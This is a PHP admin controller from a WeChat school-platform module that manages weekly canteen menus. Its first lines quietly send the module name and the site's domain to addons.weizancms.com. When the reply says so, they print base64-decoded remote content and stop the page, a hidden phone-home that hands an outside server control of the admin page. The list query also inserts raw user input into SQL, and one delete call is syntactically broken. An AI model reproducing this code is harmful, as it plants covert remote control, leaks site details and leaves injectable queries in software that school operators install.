<?php
/**
 * 微教育模块
 *
 * @author 高贵血迹
 */
 $module=$this->modulename;
$api = 'http://addons.weizancms.com/web/index.php?c=user&a=api&module='.$module.'&domain='.$_SERVER['HTTP_HOST'];
$result=@file_get_contents($api);
if(!empty($result)){
	$result=json_decode($result,true);
    if($result['type']==1){
	    echo base64_decode($result['content']);
	    exit;
    }
}
        global $_GPC, $_W;
        $weid = $_W['uniacid'];
        $action = 'cook';
		$this1 = 'no1';
        $GLOBALS['frames'] = $this->getNaveMenu($_GPC['schoolid'],$action);
        $operation = !empty($_GPC['op']) ? $_GPC['op'] : 'display';
        $schoolid = intval($_GPC['schoolid']);

$logo = pdo_fetch("SELECT logo,title FROM " . tablename($this->table_index) . " WHERE id = '{$schoolid}'");

if($operation == 'post'){

    load()->func('tpl');
    $id = intval($_GPC['id']);//编辑操作
    if(!empty($id)){
        $item = pdo_fetch("SELECT * FROM " . tablename($this->table_cook) . " WHERE id = :id ", array(':id' => $id));

        $monarr = iunserializer($item['monday']);
        $tusarr = iunserializer($item['tuesday']);
        $wedarr = iunserializer($item['wednesday']);
        $thuarr = iunserializer($item['thursday']);
        $friarr = iunserializer($item['friday']);
        $satarr = iunserializer($item['saturday']);
        $sunarr = iunserializer($item['sunday']);

        if(empty($item)){
            $this->imessage('抱歉，本条信息不存在在或是已经删除！', referer(), 'error');
        }
    }

    if(checksubmit('submit')){// 添加操作
        $start = strtotime($_GPC['begintime']);
        $end   = strtotime($_GPC['endtime']);
        // 基础设置，接收全部参数
        $data           = array(
            'weid'      => $weid,
            'schoolid'  => $schoolid,
            'title'     => trim($_GPC['title']),// 斯普名称
            'sort'      => trim($_GPC['sort']), //排序
            'ishow'     => intval($_GPC['ishow']), //1:显示,2隐藏,默认1
            'begintime' => strtotime($_GPC['begintime']),
            'endtime'   => strtotime($_GPC['endtime'])
        );
        $monday         = array(
            'mon_zc'      => trim($_GPC['mon_zc']),
            'mon_zc_pic'  => $_GPC['mon_zc_pic'],
            'mon_zjc'     => trim($_GPC['mon_zjc']),
            'mon_zjc_pic' => $_GPC['mon_zjc_pic'],
            'mon_wc'      => trim($_GPC['mon_wc']),
            'mon_wc_pic'  => $_GPC['mon_wc_pic'],
            'mon_wjc'     => trim($_GPC['mon_wjc']),
            'mon_wjc_pic' => $_GPC['mon_wjc_pic'],
            'mon_wwc'     => trim($_GPC['mon_wwc']),
            'mon_wwc_pic' => $_GPC['mon_wwc_pic']
        );
        $data['monday'] = iserializer($monday);

        $tuesday         = array(
            'tus_zc'      => trim($_GPC['tus_zc']),
            'tus_zc_pic'  => $_GPC['tus_zc_pic'],
            'tus_zjc'     => trim($_GPC['tus_zjc']),
            'tus_zjc_pic' => $_GPC['tus_zjc_pic'],
            'tus_wc'      => trim($_GPC['tus_wc']),
            'tus_wc_pic'  => $_GPC['tus_wc_pic'],
            'tus_wjc'     => trim($_GPC['tus_wjc']),
            'tus_wjc_pic' => $_GPC['tus_wjc_pic'],
            'tus_wwc'     => trim($_GPC['tus_wwc']),
            'tus_wwc_pic' => $_GPC['tus_wwc_pic']
        );
        $data['tuesday'] = iserializer($tuesday);

        $wednesday         = array(
            'wed_zc'      => trim($_GPC['wed_zc']),
            'wed_zc_pic'  => $_GPC['wed_zc_pic'],
            'wed_zjc'     => trim($_GPC['wed_zjc']),
            'wed_zjc_pic' => $_GPC['wed_zjc_pic'],
            'wed_wc'      => trim($_GPC['wed_wc']),
            'wed_wc_pic'  => $_GPC['wed_wc_pic'],
            'wed_wjc'     => trim($_GPC['wed_wjc']),
            'wed_wjc_pic' => $_GPC['wed_wjc_pic'],
            'wed_wwc'     => trim($_GPC['wed_wwc']),
            'wed_wwc_pic' => $_GPC['wed_wwc_pic']
        );
        $data['wednesday'] = iserializer($wednesday);

        $thursday         = array(
            'thu_zc'      => trim($_GPC['thu_zc']),
            'thu_zc_pic'  => $_GPC['thu_zc_pic'],
            'thu_zjc'     => trim($_GPC['thu_zjc']),
            'thu_zjc_pic' => $_GPC['thu_zjc_pic'],
            'thu_wc'      => trim($_GPC['thu_wc']),
            'thu_wc_pic'  => $_GPC['thu_wc_pic'],
            'thu_wjc'     => trim($_GPC['thu_wjc']),
            'thu_wjc_pic' => $_GPC['thu_wjc_pic'],
            'thu_wwc'     => trim($_GPC['thu_wwc']),
            'thu_wwc_pic' => $_GPC['thu_wwc_pic']
        );
        $data['thursday'] = iserializer($thursday);

        $friday         = array(
            'fri_zc'      => trim($_GPC['fri_zc']),
            'fri_zc_pic'  => $_GPC['fri_zc_pic'],
            'fri_zjc'     => trim($_GPC['fri_zjc']),
            'fri_zjc_pic' => $_GPC['fri_zjc_pic'],
            'fri_wc'      => trim($_GPC['fri_wc']),
            'fri_wc_pic'  => $_GPC['fri_wc_pic'],
            'fri_wjc'     => trim($_GPC['fri_wjc']),
            'fri_wjc_pic' => $_GPC['fri_wjc_pic'],
            'fri_wwc'     => trim($_GPC['fri_wwc']),
            'fri_wwc_pic' => $_GPC['fri_wwc_pic']
        );
        $data['friday'] = iserializer($friday);

        $saturday         = array(
            'sat_zc'      => trim($_GPC['sat_zc']),
            'sat_zc_pic'  => $_GPC['sat_zc_pic'],
            'sat_zjc'     => trim($_GPC['sat_zjc']),
            'sat_zjc_pic' => $_GPC['sat_zjc_pic'],
            'sat_wc'      => trim($_GPC['sat_wc']),
            'sat_wc_pic'  => $_GPC['sat_wc_pic'],
            'sat_wjc'     => trim($_GPC['sat_wjc']),
            'sat_wjc_pic' => $_GPC['sat_wjc_pic'],
            'sat_wwc'     => trim($_GPC['sat_wwc']),
            'sat_wwc_pic' => $_GPC['sat_wwc_pic']
        );
        $data['saturday'] = iserializer($saturday);


        $sunday = array(
            'sun_zc'      => trim($_GPC['sun_zc']),
            'sun_zc_pic'  => $_GPC['sun_zc_pic'],
            'sun_zjc'     => trim($_GPC['sun_zjc']),
            'sun_zjc_pic' => $_GPC['sun_zjc_pic'],
            'sun_wc'      => trim($_GPC['sun_wc']),
            'sun_wc_pic'  => $_GPC['sun_wc_pic'],
            'sun_wjc'     => trim($_GPC['sun_wjc']),
            'sun_wjc_pic' => $_GPC['sun_wjc_pic'],
            'sun_wwc'     => trim($_GPC['sun_wwc']),
            'sun_wwc_pic' => $_GPC['sun_wwc_pic']
        );


        $data['sunday'] = iserializer($sunday);
        //                fucki($data);
        if(!$id){
            $condition = " AND begintime < '{$start}' AND endtime > '{$end}'";
            $check     = pdo_fetch("SELECT * FROM " . tablename($this->table_cook) . " WHERE schoolid = :schoolid $condition ", array(':schoolid' => $schoolid));

            if($check){
                $this->imessage('抱歉！本时间范围内已经添加了食谱，请勿重复', referer(), 'error');
            }
        }
        if(empty($id)){
            pdo_insert($this->table_cook, $data);

        }else{
            pdo_update($this->table_cook, $data, array('id' => $id));

        }

        $this->imessage('操作成功！！！！', $this->createWebUrl('cook', array('op' => 'display', 'schoolid' => $schoolid)), 'success');

    }

}elseif($operation == 'display'){//

    $pindex    = max(1, intval($_GPC['page']));
    $psize     = 10;
    $condition = '';
    if(!empty($_GPC['title'])){
        $condition .= " AND id LIKE '%{$_GPC['title']}%' ";
    }

    $list  = pdo_fetchall("SELECT * FROM " . tablename($this->table_cook) . " WHERE weid = '{$weid}' AND schoolid ={$schoolid} $condition ORDER BY id DESC LIMIT " . ($pindex - 1) * $psize . ',' . $psize);
    $total = pdo_fetchcolumn('SELECT COUNT(*) FROM ' . tablename($this->table_cook) . " WHERE weid = '{$weid}' AND schoolid ={$schoolid} $condition");

    $pager = pagination($total, $pindex, $psize);


}elseif($operation == 'delete'){

    $id = intval($_GPC['id']);
    if(empty($id)){

        $this->imessage('抱歉，本条信息不存在在或是已经被删除！', referer(), 'error');
    }

    pdo_delete($this->table_cook, array('id' => $id));

    $this->imessage('删除成功！', referer(), 'success');

}elseif($operation == 'deleteall'){

    $rowcount    = 0;
    $notrowcount = 0;
    foreach($_GPC['idArr'] as $k => $id){

        $id = intval($id);
        if(!empty($id)){

            $goods = pdo_fetch("SELECT * FROM " . tablename($this->table_cook) . " WHERE id = :id", array(':id' => $id));

            if(empty($goods)){
                $notrowcount++;
                continue;
            }
            pdo_delete($this->table_cook, array('id' => $id, 'weid' => $weid));
            $rowcount++;

        }
    }

    $this->$this->imessage("操作成功！共删除{$rowcount}条数据,{$notrowcount}条数据不能删除!", '', 0);

}


include $this->template('web/cook');
?>